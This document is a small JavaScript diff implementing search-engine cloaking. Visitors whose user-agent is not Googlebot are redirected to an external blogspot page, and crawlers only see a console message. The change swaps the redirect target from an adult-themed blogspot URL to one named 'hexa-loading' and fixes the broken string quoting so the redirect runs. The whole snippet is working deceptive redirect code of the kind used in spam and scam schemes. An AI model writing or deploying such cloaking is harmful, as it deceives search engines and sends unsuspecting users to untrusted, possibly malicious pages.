@@ -1,8 +1,8 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = https://onlyfans-pessi5.blogspot.com/2026/05/hah.html;
+  window.location.href = "https://hexa-loading.blogspot.com/2026/06/afa.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
-  console.log(THanks for visiting my page);
+  console.log("THanks for visiting my page");
 }
